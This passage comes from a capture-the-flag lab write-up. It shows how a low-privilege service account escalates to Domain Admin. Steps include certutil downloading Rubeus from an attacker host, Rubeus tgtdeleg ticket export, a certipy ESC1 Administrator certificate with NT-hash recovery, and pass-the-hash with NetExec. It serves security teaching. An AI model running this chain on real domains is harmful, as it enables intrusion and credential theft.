PS C:\Users\Public> PS C:\Users\Public> klist

Current LogonId is 0:0x4e9f8

Cached Tickets: (1)

#0>     Client: svc-iisweb @ RUBBERSTAMP.LOCAL
        Server: krbtgt/RUBBERSTAMP.LOCAL @ RUBBERSTAMP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
        Start Time: 11/11/2026 14:18:17 (local)
        End Time:   11/12/2026 0:18:17 (local)
        Renew Time: 11/18/2026 14:18:17 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY 
        Kdc Called: SRV01
```

We confirm we're genuinely authenticated to the domain as `svc-iisweb`, holding a valid, forwardable TGT. The **forwardable** flag will matter later when we abuse Kerberos delegation.

## 7.4 Mapping the Domain

```powershell
PS C:\Users\Public> Get-ADDomain | Select DNSRoot,NetBIOSName,DomainSID

DNSRoot           NetBIOSName DomainSID                              
-------           ----------- ---------                              
rubberstamp.local RUBBERSTAMP S-1-5-21-1966530601-3185510712-10604624
```

## 7.5 Enumerating Domain Users

```powershell
PS C:\Users\Public> Get-ADUser -Filter * ` -Properties ServicePrincipalNames,MemberOf,PasswordLastSet,AdminCount,Description | Select SamAccountName,ServicePrincipalNames,MemberOf,PasswordLastSet,AdminCount,Description | Format-Table -AutoSize

SamAccountName ServicePrincipalNames MemberOf                                                                          
-------------- --------------------- --------                                                                          
Administrator  {}                    {CN=Group Policy Creator Owners,CN=Users,DC=rubberstamp,DC=local, CN=Domain Adm...
Guest          {}                    {CN=Guests,CN=Builtin,DC=rubberstamp,DC=local}                                    
krbtgt         {kadmin/changepw}     {CN=Denied RODC Password Replication Group,CN=Users,DC=rubberstamp,DC=local}      
svc-iisweb     {}                    {}   
```

It's a very small, almost "lab-sized" domain: only four accounts exist, and only `Administrator` and `krbtgt` belong to any interesting groups.

## 7.6 Confirming the Domain Admins Group

```powershell
PS C:\Users\Public> Get-ADGroupMember "Domain Admins" | Select SamAccountName,objectClass

SamAccountName objectClass
-------------- -----------
Administrator  user 
```

Only the built-in `Administrator` account is a Domain Admin — this is our ultimate target identity.

## 7.7 Looking for Kerberoastable Accounts

Kerberoasting targets accounts with a Service Principal Name (SPN) set, since any authenticated user can request a service ticket for such an account and attempt to crack its password offline. We check for candidates:

```powershell
PS C:\Users\Public> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} ` -Properties ServicePrincipalName | Select SamAccountName,ServicePrincipalName

SamAccountName ServicePrincipalName
-------------- --------------------
krbtgt         {kadmin/changepw} 
```

The only SPN belongs to `krbtgt`, which is never a valid Kerberoasting target (its ticket can't practically be cracked and Windows actively protects it). This path is closed.

## 7.8 Double-Checking Our Own Account

```powershell
PS C:\Users\Public> Get-ADUser svc-iisweb -Properties ServicePrincipalNames,MemberOf,PasswordLastSet,AdminCount


DistinguishedName     : CN=svc-iisweb,CN=Users,DC=rubberstamp,DC=local
Enabled               : True
GivenName             : 
MemberOf              : {}
Name                  : svc-iisweb
ObjectClass           : user
ObjectGUID            : 61026701-ea38-4254-980b-dcb6d9ad1209
PasswordLastSet       : 10/25/2026 3:51:06 PM
SamAccountName        : svc-iisweb
ServicePrincipalNames : {}
SID                   : S-1-5-21-1966530601-3185510712-10604624-1111
Surname               : 
UserPrincipalName     : svc-iisweb@rubberstamp.local
```

## 7.9 Taking Stock

Putting the enumeration results together:

- No SPNs to Kerberoast.
- No interesting group memberships listed for `svc-iisweb`.
- Password was set recently (not a stale, crackable credential).
- `AdminCount` is blank (never had elevated rights).

**Conclusion of this phase:**

- No useful Kerberoast target exists.
- No domain user has obvious administrative rights we could abuse directly.
- No path forward through plain AD group membership.

That earlier `BUILTIN\Certificate Service DCOM Access` membership is looking more and more like the intended route. The next high-value target is clearly **ADCS**.

---

# Phase 8: Pivoting to Active Directory Certificate Services (ADCS)

ADCS misconfigurations are one of the most common — and most powerful — privilege escalation paths in modern Windows AD environments, because a certificate can often be used in place of a password for authentication. SpecterOps' research catalogued a whole family of these issues under the **ESC1–ESC8+** naming scheme, and this box looks purpose-built to showcase one of them.

## 8.1 Confirming the Host Is a Certificate Authority

```powershell
PS C:\Users\Public> certutil -config "SRV01.rubberstamp.local\rubberstamp-SRV01-CA" -CAInfo
Exit module count: 1
CA name: rubberstamp-SRV01-CA
Sanitized CA short name (DS name): rubberstamp-SRV01-CA
CA type: 0 -- Enterprise Root CA
    ENUM_ENTERPRISE_ROOTCA -- 0
CA cert count: 1
KRA cert count: 0
KRA cert used count: 0
CA cert[0]: 3 -- Valid
CA cert version[0]: 0 -- V0.0
CA cert verify status[0]: 0
CRL[0]: 3 -- Valid
CRL Publish Status[0]: 5
    CPF_BASE -- 1
    CPF_COMPLETE -- 4
Delta CRL Publish Status[0]: 6
    CPF_DELTA -- 2
    CPF_COMPLETE -- 4
DNS Name: SRV01.rubberstamp.local
Advanced Server: 1
CA locale name: en-US
Subject Template OIDs: 1.2.840.113549.1.9.1
2.5.4.3
2.5.4.11
2.5.4.10
2.5.4.7
2.5.4.8
0.9.2342.19200300.100.1.25
2.5.4.6

CertUtil: -CAInfo command completed successfully.
```

Confirmed: `SRV01` is running an **Enterprise Root CA** named `rubberstamp-SRV01-CA`. Being an *Enterprise* CA (as opposed to a Standalone CA) means it's integrated with Active Directory and issues certificates based on templates stored in AD — exactly the setup needed for ESC1-style attacks.

## 8.2 Listing Available Certificate Templates

```powershell
PS C:\Users\Public> certutil -config "SRV01.rubberstamp.local\rubberstamp-SRV01-CA" -CATemplates
PrivClientAuth: PrivClientAuth -- Auto-Enroll: Access is denied.
DirectoryEmailReplication: Directory Email Replication -- Access is denied.
DomainControllerAuthentication: Domain Controller Authentication -- Access is denied.
KerberosAuthentication: Kerberos Authentication -- Access is denied.
EFSRecovery: EFS Recovery Agent -- Access is denied.
EFS: Basic EFS -- Auto-Enroll: Access is denied.
DomainController: Domain Controller -- Access is denied.
WebServer: Web Server -- Access is denied.
Machine: Computer -- Access is denied.
User: User -- Auto-Enroll: Access is denied.
SubCA: Subordinate Certification Authority -- Access is denied.
Administrator: Administrator -- Access is denied.
CertUtil: -CATemplates command completed successfully.
```

The "Access is denied" messages next to **Auto-Enroll** simply mean our account isn't configured for *automatic* enrollment on those templates — it doesn't mean we can't manually request a certificate from them. One template name jumps out immediately: **`PrivClientAuth`** — a non-default, custom template, almost certainly purpose-built (and likely misconfigured) for this challenge.

## 8.3 Checking CA Policy Module Flags

```powershell
PS C:\Users\Public> certutil -getreg policy\EditFlags
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\rubberstamp-SRV01-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags:

  EditFlags REG_DWORD = 11014e (1114446)
    EDITF_REQUESTEXTENSIONLIST -- 2
    EDITF_DISABLEEXTENSIONLIST -- 4
    EDITF_ADDOLDKEYUSAGE -- 8
    EDITF_BASICCONSTRAINTSCRITICAL -- 40 (64)
    EDITF_ENABLEAKIKEYID -- 100 (256)
    EDITF_ENABLEDEFAULTSMIME -- 10000 (65536)
    EDITF_ENABLECHASECLIENTDC -- 100000 (1048576)
) 
CertUtil: -getreg command completed successfully.
```

This confirms the CA exists and `PrivClientAuth` is an available, enabled template. Time to look inside the template itself to understand exactly how it's configured.

## 8.4 Inspecting the `PrivClientAuth` Template's Attributes

```powershell
PS C:\Users\Public> $x=(Get-ADRootDSE).configurationNamingContext;Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$x" -Filter 'objectClass -eq "pKICertificateTemplate"' -Properties msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,msPKI-RA-Signature,pKIExtendedKeyUsage|Where-Object Name -eq 'PrivClientAuth'|Format-List Name,msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,msPKI-RA-Signature,pKIExtendedKeyUsage


Name                        : PrivClientAuth
msPKI-Certificate-Name-Flag : 1
msPKI-Enrollment-Flag       : 9
msPKI-RA-Signature          : 0
pKIExtendedKeyUsage         : {1.3.6.1.5.5.7.3.2, 1.3.6.1.5.5.7.3.4, 1.3.6.1.4.1.311.10.3.4}
```

Breaking down what these numeric flags mean in plain English:

- **`msPKI-Certificate-Name-Flag = 1`** — this corresponds to `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`. In other words, the person requesting the certificate gets to choose what identity (subject / Subject Alternative Name) goes into the cert, rather than the CA deriving it from their actual AD account. This is the single most dangerous setting an ADCS template can have, because it means we can ask for a certificate claiming to be *anyone*, including the domain Administrator.
- **`msPKI-RA-Signature = 0`** — no additional "enrollment agent" signatures are required to approve the request, so there's no extra authorization gate in our way.
- **`pKIExtendedKeyUsage`** includes `1.3.6.1.5.5.7.3.2` (**Client Authentication**) — meaning a certificate from this template can actually be used to authenticate to the domain (e.g. via Kerberos PKINIT or Schannel), not just for something cosmetic like code-signing.

Put together — enrollee-supplied subject **plus** client authentication EKU **plus** no extra approval — this is the textbook definition of **ESC1**.

## 8.5 Confirming Who Can Enroll

Knowing the template is dangerous *in theory* isn't enough — we need to confirm that **our** account (or a group we belong to) is actually allowed to enroll against it:

```powershell
PS C:\Users\Public> $ct = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$((Get-ADRootDSE).configurationNamingContext)" -Filter 'Name -eq "PrivClientAuth"' -Properties ntSecurityDescriptor; $ct.ntSecurityDescriptor.Access | ? { $_.ObjectType -eq [guid]"0e10c968-78fb-11d2-90d4-00c04f79dc55" } | select IdentityReference,AccessControlType,ActiveDirectoryRights

IdentityReference             AccessControlType                      ActiveDirectoryRights
-----------------             -----------------                      ---------------------
RUBBERSTAMP\Domain Admins                 Allow ReadProperty, WriteProperty, ExtendedRight
RUBBERSTAMP\Domain Users                  Allow ReadProperty, WriteProperty, ExtendedRight
RUBBERSTAMP\Enterprise Admins             Allow ReadProperty, WriteProperty, ExtendedRight
```

The GUID `0e10c968-78fb-11d2-90d4-00c04f79dc55` is the well-known **Certificate-Enrollment** extended right in Active Directory — it's the specific permission that controls who's allowed to request (enroll for) a certificate from a given template.

The output confirms what we hoped: **`RUBBERSTAMP\Domain Users`** has enrollment rights on `PrivClientAuth`. Since `svc-iisweb` is a standard domain user account, it already qualifies — no further privilege is needed to request a certificate from this template.

---

# Phase 9: Obtaining Usable Kerberos Credentials for `svc-iisweb`

## 9.1 Web Enrollment Requires Real Credentials

Certificate enrollment over HTTP requires the requester to authenticate — either interactively (NTLM/Kerberos handshake) or via Windows Integrated Authentication:

```powershell
PS C:\Users\Public> Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri "http://SRV01.rubberstamp.local/certsrv/certrqxt.asp" -TimeoutSec 10
```

And from the attacker box, hitting the enrollment endpoint without credentials confirms authentication is indeed required:

```shell
┌──(kuroshiro㉿underground)-[~/THM/RubberStamp]
└─$ curl -i -m 8 http://10.48.184.32/certsrv/
HTTP/1.1 401 Unauthorized
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
X-Powered-By: ASP.NET
Date: Wed, 11 Nov 2026 15:42:55 GMT
Content-Length: 0
```

## 9.2 A Detour Through Failed Enrollment Attempts

Before landing on a working method, several of the "normal" certificate-request tools failed outright, for reasons worth understanding rather than skipping over:

- `certreq -new` / `certreq -submit` simply hung with no response — likely because these rely on a local user profile/key-container context that a service account running under IIS doesn't properly have.
- `Get-Certificate` failed with `0x80070002` — a "file not found" style error that, in this context, points to a missing user profile/key storage location for the account.
- Using the raw COM interface `ICertRequest::Submit` returned `0x8007000d` ("The data is invalid") — the CSR we built wasn't well-formed for the API's expectations in a service-account context.
- Attempting to request in the **machine** security context instead failed with `CONTEXT_E_ROLENOTFOUND`, because `PrivClientAuth` is a **user**-only template — it simply doesn't support machine-context enrollment at all.

The common thread: anything that needs a proper interactive user profile, loaded key containers, or machine-level enrollment just won't work for an IIS service account. **Web Enrollment**, on the other hand, only needs two things:

- A Certificate Signing Request (CSR).
- The current user's valid Kerberos/NTLM credentials, supplied over HTTP via Windows Integrated Authentication.

That's a perfect fit for our situation, provided we can get a proper, exportable Kerberos ticket for `svc-iisweb` onto our attacking machine.

## 9.3 Staging Rubeus

We need `Rubeus`, a well-known Kerberos abuse tool, on the target to extract a usable ticket. We pull it down via `certutil`'s URL-cache trick (a handy LOLBin technique for fetching files without needing PowerShell's `Invoke-WebRequest` or `curl`):

```powershell
PS C:\Users\Public\Documents> certutil -urlcache -split -f http://192.168.148.25:1111/Rubeus.exe C:\Users\Public\Documents\Rubeus.exe
****  Online  ****
  000000  ...
  07de00
CertUtil: -URLCache command completed successfully.
```

## 9.4 Extracting a Usable TGT with `tgtdeleg`

```powershell
PS C:\Users\Public\Documents> .\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/SRV01.rubberstamp.local'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: vq+8Bt7wp0tzJoJagoSdtUA+C19PSvAVkZwFEmHot2Y=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFQTCCBT2gAwIBBaEDAgEWooIENTCCBDFhggQtMIIEKaADAgEFoRMbEVJVQkJFUlNUQU1QLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxFSVUJCRVJTVEFNUC5MT0NBTKOCA+MwggPfoAMCARKhAwIBAqKCA9EEggPN2Jvsn4In2Fs7I2TwQeXW59pv8jXIZx3svqcOkasPCjwQDG7saP2bsEuHAMmhTD6xmDojwsn3c6XdXVtI3R1E0cDZTRLZXjnEXFHQ0aMmCEO7w6TcXT9OoqPtSZxBR0I7TF4FpN+jHCfUnRQaS+R8LgtThpVflh4PRrEXyUDr2kqB+Wz5LO3D44rWC3AQW8aFyAaFmRVTsCNJuQapNPdup5sLmsV+iwPR+Tg6qEV3PwaWcLZogRhEG06/7/WzEs+IOGka3ViNNKlmOkkPXUTpCFKqW3hk68q05BYx7mE1VAEubBIsXAXplg49Vv06rsvwHF6Sf7didp8rTkXGMtBjpvatUS/mpHYAVAksbUbl1sU+doH5fWzP/shlXBdrcqz4yCN3u32Eg85g68VGoI8MSE4E2Yk2d7lViPRQWXDVgqJf7SgG/aTeWB1AT5DKIELCSEEem1zDZgN1rMUxc9thd3R58t7uiqBeb5Nh5ukjLucbiKDI3A4aEw47yV26RFiL5RqegPAWpc8BKQmhHMpMkMcgbcTX7XOWuoW5K0dCaPkf1QAGMVJSxrS1+6X5qJtMx9CIXoX7cZetPRC4AMGN66GOFoNQ6ac1VvqS+GCmoqwxHU1ySgfGNkL3hO0uJA8kZnoPnYqH8tGuEGZ5FlsWJyuW4oFQU6ylE/yConZKS2JUjvK+71NCKpG8hGeR5Hv4p9vT8PT9ytVTksGFsFXkB0YlVjPUHoi/pG0phzKywn5QIo+GDhd+948aib4F7Z8/kg2PX1zNo8tmiKvVfpF8ULXyJ+a6T5RXm4FVjebGdBIEIe/a41pYNJYcL/hnovK7JoFDOxnm+ztcSAIoBY3KIliVh9Qurqc32X5A8SfBYJ/QrEpEsdwC9UU0EQxI7e+rCgsxM0bou2qZK8FhXgG++hIlwj4f7+c8tNrCYAdIxkjcDvCZW2aQYDJi1vr6PGv6YeN2TrayEEhsF9mT3YB62e+toL4VMTFbYaoeftG5ZcPa1LXduMoPuTt6+lVk2XCgxtXU8DLqc+c3qWKdYlpl+GLcF3NYpRvuHq7L8b6UuWrU5Y/QChp5pRIKjwq1nI5qlYgRVdQylrj7u7ZxbIS+8o0PhP8okF1xIeHU1PWWWi0oSXkqpz4iu+UItu4TI1FiIhnLEifeoytcOipGA1kqBB0XFMzJE9c9HtBP1VMw99DsbPQFjEDWJL0oBLzJ2CcaIZpUBCjc1/VYopFEV7wEY/0HSAHF25JbukA/E9OWevzzGQE9ysBbLjX23d/Awwc0MgVeotC9FPraBMRgxaOB9zCB9KADAgEAooHsBIHpfYHmMIHjoIHgMIHdMIHaoCswKaADAgESoSIEIPywSlMP2LiZFnd6hu1ZHBBkf+X5DvhSq2fmmntWNca4oRMbEVJVQkJFUlNUQU1QLkxPQ0FMohcwFaADAgEBoQ4wDBsKc3ZjLWlpc3dlYqMHAwUAYCEAAKURGA8yMDI2MTExMjA1NTcyNlqmERgPMjAyNjExMTIxNTQ1NTJapxEYDzE5NzAwMTAxMDAwMDAwWqgTGxFSVUJCRVJTVEFNUC5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRUlVCQkVSU1RBTVAuTE9DQUw=
```

This technique relies on how `tgtdeleg` quietly abuses the SSPI/Kerberos GSS-API: it initiates a fake delegation handshake against a service (here, `cifs/SRV01.rubberstamp.local`), and because our TGT is **forwardable**, the Key Distribution Center hands back a usable delegated TGT embedded in the GSS-API output — all without ever needing to know `svc-iisweb`'s actual password. This is a well-known, low-noise way to "export" a usable Kerberos ticket from a context where you don't have direct access to LSASS memory or the account's credentials.

## 9.5 Converting the Ticket for Use on Linux

```shell
┌──(kuroshiro㉿underground)-[~/THM/RubberStamp]
└─$ echo "BASE64_FROM_RUBEUS" | base64 -d > svc.kirb
```

Rubeus produces tickets in Windows' native `.kirbi` format, while Linux-based tools (Impacket, Certipy) expect the MIT Kerberos `ccache` format. `ticketConverter` from Impacket bridges that gap:

```shell
┌──(kuroshiro㉿underground)-[~/THM/RubberStamp]
└─$ impacket-ticketConverter svc.kirb svc.ccache
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

We then point the standard Kerberos environment variable at our new ticket cache so every Kerberos-aware tool we run afterward automatically uses it:

```shell
┌──(kuroshiro㉿underground)-[~/THM/RubberStamp]
└─$ export KRB5CCNAME=svc.ccache
```

---

# Phase 10: Validating the Attack Path with Certipy

Rather than relying purely on manual AD queries, we double-check our findings with `certipy-ad`, the de-facto standard tool for enumerating and abusing ADCS misconfigurations.

## 10.1 Running Certipy's Vulnerability Scan

```shell
┌──(kuroshiro㉿underground)-[~/THM/RubberStamp]
└─$ certipy-ad find -k -dc-ip 10.49.178.83 -target SRV01.rubberstamp.local -vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'rubberstamp-SRV01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'rubberstamp-SRV01-CA'
[*] Checking web enrollment for CA 'rubberstamp-SRV01-CA' @ 'SRV01.rubberstamp.local'
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Saving text output to '20261112010119_Certipy.txt'
[*] Wrote text output to '20261112010119_Certipy.txt'
[*] Saving JSON output to '20261112010119_Certipy.json'
[*] Wrote JSON output to '20261112010119_Certipy.json'
```

Certipy authenticates using our converted Kerberos ticket (`-k`) and crawls the CA and all certificate templates, flagging any known-dangerous configurations automatically.

## 10.2 Reading the JSON Report

```json
{
  "Certificate Authorities": {
    "0": {
      "CA Name": "rubberstamp-SRV01-CA",
      "DNS Name": "SRV01.rubberstamp.local",
      "Certificate Subject": "CN=rubberstamp-SRV01-CA, DC=rubberstamp, DC=local",
      "Certificate Serial Number": "5BE81499E9E5D28940D85CD5A88F26EB",
      "Certificate Validity Start": "2026-10-25 16:49:25+00:00",
      "Certificate Validity End": "2031-10-25 16:59:25+00:00",
      "Web Enrollment": {
        "http": {
          "enabled": true
        },
        "https": {
          "enabled": false,
          "channel_binding": null
        }
      },
      "User Specified SAN": "Disabled",
      "Request Disposition": "Issue",
      "Enforce Encryption for Requests": "Enabled",
      "Active Policy": "CertificateAuthority_MicrosoftDefault.Policy",
      "Permissions": {
        "Owner": "RUBBERSTAMP.LOCAL\\Administrators",
        "Access Rights": {
          "1": [
            "RUBBERSTAMP.LOCAL\\Administrators",
            "RUBBERSTAMP.LOCAL\\Domain Admins",
            "RUBBERSTAMP.LOCAL\\Enterprise Admins"
          ],
          "2": [
            "RUBBERSTAMP.LOCAL\\Administrators",
            "RUBBERSTAMP.LOCAL\\Domain Admins",
            "RUBBERSTAMP.LOCAL\\Enterprise Admins"
          ],
          "512": [
            "RUBBERSTAMP.LOCAL\\Authenticated Users"
          ]
        }
      },
      "[!] Vulnerabilities": {
        "ESC8": "Web Enrollment is enabled over HTTP."
      }
    }
  },
  "Certificate Templates": {
    "0": {
      "Template Name": "PrivClientAuth",
      "Display Name": "PrivClientAuth",
      "Certificate Authorities": [
        "rubberstamp-SRV01-CA"
      ],
      "Enabled": true,
      "Client Authentication": true,
      "Enrollment Agent": false,
      "Any Purpose": false,
      "Enrollee Supplies Subject": true,
      "Certificate Name Flag": [
        1
      ],
      "Enrollment Flag": [
        1,
        8
      ],
      "Private Key Flag": [
        16,
        256
      ],
      "Extended Key Usage": [
        "Client Authentication",
        "Secure Email",
        "Encrypting File System"
      ],
      "Requires Manager Approval": false,
      "Requires Key Archival": false,
      "Authorized Signatures Required": 0,
      "Schema Version": 4,
      "Validity Period": "1 year",
      "Renewal Period": "6 weeks",
      "Minimum RSA Key Length": 2048,
      "Template Created": "2026-10-25 20:46:40+00:00",
      "Template Last Modified": "2026-10-25 20:46:46+00:00",
      "Permissions": {
        "Enrollment Permissions": {
          "Enrollment Rights": [
            "RUBBERSTAMP.LOCAL\\Domain Admins",
            "RUBBERSTAMP.LOCAL\\Domain Users",
            "RUBBERSTAMP.LOCAL\\Enterprise Admins"
          ]
        },
        "Object Control Permissions": {
          "Owner": "RUBBERSTAMP.LOCAL\\Administrator",
          "Full Control Principals": [
            "RUBBERSTAMP.LOCAL\\Domain Admins",
            "RUBBERSTAMP.LOCAL\\Enterprise Admins"
          ],
          "Write Owner Principals": [
            "RUBBERSTAMP.LOCAL\\Domain Admins",
            "RUBBERSTAMP.LOCAL\\Enterprise Admins"
          ],
          "Write Property Enroll": [
            "RUBBERSTAMP.LOCAL\\Domain Admins",
            "RUBBERSTAMP.LOCAL\\Domain Users",
            "RUBBERSTAMP.LOCAL\\Enterprise Admins"
          ]
        }
      },
      "[+] User Enrollable Principals": [
        "RUBBERSTAMP.LOCAL\\Domain Users"
      ],
      "[!] Vulnerabilities": {
        "ESC1": "Enrollee supplies subject and template allows client authentication."
      }
    }
  }
}
```

Certipy independently confirms both suspicions from our manual enumeration, and even flags a second one:

- **`ESC1`** on `PrivClientAuth` — confirming that any Domain User can enroll, choose their own subject name, and get back a certificate valid for client authentication. This is our primary, confirmed path to impersonating the Administrator.
- **`ESC8`** on the CA itself — the CA's Web Enrollment interface is reachable over plain HTTP with no channel binding, which in a different network position could be abused via NTLM relay to request certificates on behalf of a relayed victim (such as the Domain Controller's own machine account). We attempted this path as well, but weren't able to get a working NTLM relay chain going in this particular lab network, so we pivot fully to the more reliable **ESC1** path.

---

# Phase 11: Exploiting ESC1 — Minting an Administrator Certificate

## 11.1 Requesting the Certificate as "Administrator"

This is the payoff of all the enumeration: using Certipy, we request a certificate from the vulnerable `PrivClientAuth` template, but instead of putting our own identity in the request, we specify the **Administrator's User Principal Name (UPN)** as the Subject Alternative Name. Because the template lets the *requester* dictate the subject, the CA will happily sign a certificate that claims to belong to the domain Administrator:

```shell
┌──(kuroshiro㉿underground)-[~/THM/RubberStamp]
└─$ certipy-ad req -k -dc-ip 10.49.178.83 -ca rubberstamp-SRV01-CA -template PrivClientAuth -upn Administrator@rubberstamp.local -target SRV01.rubberstamp.local
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@rubberstamp.local'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

We now hold a fully valid, CA-signed certificate (`administrator.pfx`) that asserts the identity `Administrator@rubberstamp.local` — without ever having touched the real Administrator's password or hash.

## 11.2 Trading the Certificate for a TGT and an NT Hash

Having a certificate isn't the end goal by itself — we need to actually use it to authenticate. Certipy's `auth` command performs a Kerberos **PKINIT** authentication using the certificate, which the KDC accepts and returns a TGT for the impersonated account. As a very convenient bonus, PKINIT's protocol extensions (`PAC_CREDENTIAL_INFO`) let us also recover the account's actual **NT hash**:

```shell
┌──(kuroshiro㉿underground)-[~/THM/RubberStamp]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.49.178.83 -domain rubberstamp.local -username Administrator
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@rubberstamp.local'
[*] Using principal: 'administrator@rubberstamp.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@rubberstamp.local': aad3b435b51404eeaad3b435b51404ee:74e3ad5b3de0d7500114e727d4f073f9
```

This is the finishing blow: we now have the Administrator's NT hash, which is functionally equivalent to having their plaintext password for authentication purposes (pass-the-hash). We've gone from an unauthenticated anonymous scan all the way to full **Domain Admin** credentials.

---

# Phase 12: Domain Compromise — Capturing `root.txt`

With the Administrator's NT hash in hand, we authenticate directly via SMB and execute a command remotely (using `wmiexec` under the hood through NetExec) to read the final flag straight off the Administrator's Desktop:

```shell
┌──(kuroshiro㉿underground)-[~/THM/RubberStamp]
└─$ nxc smb SRV01.rubberstamp.local -u Administrator -H 74e3ad5b3de0d7500114e727d4f073f9 -x 'type C:\Users\Administrator\Desktop\root.txt'
SMB         10.49.178.83    445    SRV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV01) (domain:rubberstamp.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.49.178.83    445    SRV01            [+] rubberstamp.local\Administrator:74e3ad5b3de0d7500114e727d4f073f9 (Pwn3d!)
SMB         10.49.178.83    445    SRV01            [+] Executed command via wmiexec
SMB         10.49.178.83    445    SRV01            THM{REDACTED}
```

**`Pwn3d!`** — full domain compromise confirmed, `root.txt` retrieved, and `rubberstamp.local` is completely owned.

This box is a fantastic, compact illustration of how a single leftover `.bak` file can snowball — through deserialization, Kerberos delegation, and ADCS misconfiguration — into complete takeover of an Active Directory domain.
